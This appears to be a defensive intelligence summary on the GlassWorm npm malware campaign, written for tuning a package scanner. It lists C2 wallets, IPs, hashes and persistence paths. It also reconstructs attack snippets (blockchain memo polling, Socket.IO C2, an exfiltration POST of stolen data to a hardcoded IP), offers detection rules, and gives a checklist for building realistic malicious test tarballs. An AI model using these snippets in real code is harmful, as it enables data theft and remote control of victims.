# GlassWorm C2 Intelligence Summary

**Source:** https://codeberg.org/tip-o-deincognito/glassworm-writeup  
**Date Extracted:** 2026-03-25  
**Classification:** Real-world GlassWorm attack IOCs

---

## Confirmed C2 Wallet Addresses

### Active Campaign (Current)

| Role | Wallet Address | Purpose |
|------|----------------|---------|
| **C2 Wallet** | `BjVeAjPrSKFiingBn4vZvghsGj9K9S8o8SC` | Stores C2 URLs in tx memos |
| **Funder** | `G2YxRa6wt1qePMwfJzdXG62ej4qaTC7YURzuh2Lwd3t` | Holds 1,173 SOL (funding) |
| **Fee Payer** | `E9vf42zJXFv8Ljop1cG68NAxLDat4ZEGEWDLfJVX38GF` | Pays transaction fees |
| **Nonce Authority** | `DScDQ1zV4qVMU8HQmfcJkjZhfo5QqCWdV7dbxkb2gU9C` | Durable nonce for replay protection |

### Previous Campaign

| Wallet | Status |
|--------|--------|
| `28PKnu7RzizxBzFPoLp69HLXp9bJL3JFtT2s5QzHsEA2` | Previous C2 wallet |
| `217.69.11.99` | Current C2 server IP |

---

## Real C2 Patterns (For Detector Improvement)

### 1. Blockchain API + Polling Combination

**Real Pattern:**
```javascript
// Query Solana RPC every 50 seconds
setInterval(() => {
    fetch('https://api.mainnet-beta.solana.com', {
        method: 'POST',
        body: JSON.stringify({
            method: 'getTransaction',
            params: ['BjVeAjPrSKFiingBn4vZvghsGj9K9S8o8SC']
        })
    }).then(res => res.json())
      .then(tx => extractMemo(tx));  // Extract C2 URL from memo
}, 50000);  // 50 second interval
```

**Key Indicators:**
- ✅ Specific C2 wallet address (not just any wallet)
- ✅ Polling with `setInterval` (50s, not random)
- ✅ Memo extraction (data hiding in tx memos)
- ✅ Multiple RPC endpoints with hardcoded API keys

### 2. Socket.IO C2 with Specific Reconnection

**Real Pattern:**
```javascript
const socket = io('https://217.69.11.99:4789', {
    reconnectionAttempts: 20,
    reconnectionDelay: 10000,  // 10s initial
    reconnectionDelayMax: 95000  // 95s max
});

// After disconnection: sleep 2 hours
setTimeout(() => reconnect(), 7200000);
```

**Key Indicators:**
- ✅ Specific IP addresses (Vultr hosting)
- ✅ Non-standard ports (4789, 5000, 10000)
- ✅ Aggressive reconnection (20 attempts)
- ✅ Long cooldown after failure (2 hours)

### 3. Data Exfiltration via HTTP POST

**Real Pattern:**
```javascript
// Exfiltrate to hardcoded IP
fetch('http://208.85.20.124/wall', {
    method: 'POST',
    headers: {
        'X-UUID': '7c102363-8542-459f-95dd-d845ec5df44c',
        'X-Operator': 'admin',
        'X-Build': '2024-01-15'
    },
    body: JSON.stringify(stolenData)
});
```

**Key Indicators:**
- ✅ Hardcoded IP addresses (not domains)
- ✅ Custom headers (UUID, operator handle)
- ✅ Specific paths (`/wall`, `/p2p`, `/env/`)
- ✅ Metadata in headers, not body

### 4. DHT-Based C2 Polling

**Real Pattern:**
```javascript
// Kademlia DHT polling every 50 seconds
const dht = new DHT();
dht.listen(10000);
dht.query(ea1b4260a83348243387d6cdfda3cd287e323958, (err, nodes) => {
    // Get C2 instructions from DHT
});
```

**Key Indicators:**
- ✅ DHT listening on port 10000
- ✅ Specific DHT public key
- ✅ `cache: false` in requests

---

## Confirmed IOCs (Indicators of Compromise)

### Network IOCs

**C2 Servers (Vultr Hosting):**
- `217.69.11.99` (Current primary)
- `208.85.20.124` (Exfiltration)
- `208.76.223.59` (Exfil - offline)
- `45.32.150.97`, `217.69.11.57`, `45.32.151.157`, `217.69.11.60` (Previous)

**Ports:**
- 80 (HTTP)
- 4789 (Socket.IO C2)
- 5000 (HTTP alt)
- 10000 (DHT)

**URL Paths:**
- `/get_arhive_npm/` - Malware download
- `/wall` - Data exfiltration
- `/get_encrypt_file_exe/` - Encrypted payload
- `/env/` - Environment data collection
- `/darwin-universal/?wallet=` - macOS wallet stealer
- `/module/wrtc` - WebRTC tunneling

### File Hashes (SHA256)

| Stage | Hash | Description |
|-------|------|-------------|
| Stage 1 | `fe06f0d6324dca4359f87e4fea76c4068e6bf7265962407f2c67828e128097f6` | Loader |
| Stage 2 | `fb54d95cb1738deb0d16de8b32547e76dd643e1e4762327a3554e4c4ce9d431` | Encrypted payload |
| Stage 3 | `d72c1c75958ad7c68ef2fb2480fa9ebe185e457f3b62047b31565857fa06a51a` | Decrypted RAT |
| RAT v2.27 | `41caca39e0605527f6124e18902b8719131b1e13531fa5b71da4020ea6b9e1a7` | Persistence module |

### Filesystem Artifacts

**macOS:**
- `~/Library/LaunchAgents/com.user.nodestart.plist` (persistence)
- `~/.config/system/.data/.nodejs/` (payload directory)
- `~/init.json` (configuration)

**Campaign Identifiers:**
- UUID: `7c102363-8542-459f-95dd-d845ec5df44c`
- Partner Token: `mulKRsVtolooY8S`
- DHT Pubkey: `ea1b4260a83348243387d6cdfda3cd287e323958`

---

## Detector Improvement Recommendations

### BlockchainC2 Detector - Current vs Improved

**Current (Too Broad):**
```rust
// Flags ANY blockchain API usage
if line.contains("getSignaturesForAddress") {
    findings.push(Critical("Blockchain API"));
}
```

**Improved (Context-Aware):**
```rust
// Flag ONLY real C2 patterns
let c2_wallets = [
    "BjVeAjPrSKFiingBn4vZvghsGj9K9S8o8SC",
    "28PKnu7RzizxBzFPoLp69HLXp9bJL3JFtT2s5QzHsEA2",
];

// Check for C2 wallet + polling combination
if c2_wallets.iter().any(|w| line.contains(w))
    && (line.contains("setInterval") || line.contains("setTimeout"))
{
    findings.push(Critical("Confirmed GlassWorm C2 wallet with polling"));
}

// Check for memo extraction (data hiding)
if line.contains("getTransaction")
    && line.contains("memo")
    && line.contains("setInterval")
{
    findings.push(High("Memo extraction with polling (C2 pattern)"));
}

// Check for hardcoded RPC endpoints with API keys
if line.contains("api.mainnet-beta.solana.com")
    && line.contains("Authorization")  // Hardcoded API key
    && line.contains("getTransaction")
{
    findings.push(Medium("Hardcoded RPC endpoint with auth"));
}

// Skip legitimate Web3 SDK usage
if file_path.contains("node_modules/@solana")
    || file_path.contains("node_modules/ethers")
{
    return Vec::new();  // Official SDK files
}
```

### Key Improvements

1. **Specific C2 Wallets** - Only flag confirmed C2 addresses, not all blockchain APIs
2. **Polling + Memo** - Require combination of signals
3. **Hardcoded Credentials** - Look for API keys in code
4. **Skip Official SDKs** - Don't flag `@solana/web3.js` itself

### SocketIOC2 Detector - Current vs Improved

**Current (Too Broad):**
```rust
// Flags ANY Socket.IO usage
if line.contains("socket.io") {
    findings.push(Info("Socket.IO detected"));
}
```

**Improved (C2-Specific):**
```rust
// Flag suspicious Socket.IO patterns
let c2_ips = [
    "217.69.11.",  // Vultr C2 server range
    "208.85.20.",  // Exfil server
    "45.32.150.",  // Previous C2
];

// Check for C2 IP addresses
if c2_ips.iter().any(|ip| line.contains(ip))
    && line.contains("socket.io")
{
    findings.push(Critical("Socket.IO to known C2 IP range"));
}

// Check for aggressive reconnection pattern
if line.contains("reconnection-attempts")
    && line.contains("20")  // Specific count
    && line.contains("reconnection-delay")
{
    findings.push(High("Aggressive Socket.IO reconnection (C2 pattern)"));
}

// Check for non-standard ports
if line.contains("socket.io")
    && (line.contains(":4789") || line.contains(":5000") || line.contains(":10000"))
{
    findings.push(High("Socket.IO on C2 port"));
}
```

---

## Evidence Construction Guidelines

### Create Realistic C2 Evidence

**DO (Real Patterns):**
```javascript
// Real C2 wallet polling
setInterval(() => {
    fetch('https://api.mainnet-beta.solana.com', {
        method: 'POST',
        body: JSON.stringify({
            method: 'getTransaction',
            params: ['BjVeAjPrSKFiingBn4vZvghsGj9K9S8o8SC']
        })
    }).then(extractMemo);
}, 50000);
```

**DON'T (Too Generic):**
```javascript
// Generic blockchain API (legitimate usage)
const connection = new Connection('https://api.mainnet-beta.solana.com');
const tx = await connection.getTransaction(signature);
```

### Synthetic Evidence Checklist

For `glassworm-c2-002.tgz` (improved):
- [ ] Include real C2 wallet address
- [ ] Add polling with specific interval (50s)
- [ ] Include memo extraction logic
- [ ] Add hardcoded RPC endpoint with API key
- [ ] Include Socket.IO with reconnection pattern
- [ ] Add exfiltration POST to hardcoded IP
- [ ] Use campaign UUID in headers

---

## Testing Protocol

### Verify Detector Improvements

**Test 1: @vueuse/core (Should NOT Flag)**
```bash
./target/release/glassware scan-npm @vueuse/core@10.7.2
# Expected: 0 findings or score < 7.0
```

**Test 2: Real C2 Pattern (Should Flag)**
```bash
./target/release/glassware scan-tarball evidence/glassworm-c2-002.tgz
# Expected: threat_score >= 8.0, BlockchainC2 findings
```

**Test 3: Official SDK (Should NOT Flag)**
```bash
./target/release/glassware scan-npm @solana/web3.js@1.87.6
# Expected: 0 findings
```

**Test 4: Wave 10 (Overall FP Rate)**
```bash
./target/release/glassware campaign run campaigns/wave10-1000plus.toml
# Expected: FP rate < 0.1% (≤1/1000)
```

---

## Next Actions

1. **Update BlockchainC2 Detector** with real C2 wallet addresses
2. **Update SocketIOC2 Detector** with C2 IP ranges and ports
3. **Reconstruct glassworm-c2-002.tgz** with real patterns
4. **Test on @vueuse/core** - verify no longer flagged
5. **Re-run Wave 10** - verify FP rate improves

---

**References:**
- GlassWorm Writeup: https://codeberg.org/tip-o-deincognito/glassworm-writeup
- Koi Security Research
- Aikido Security Campaign Analysis
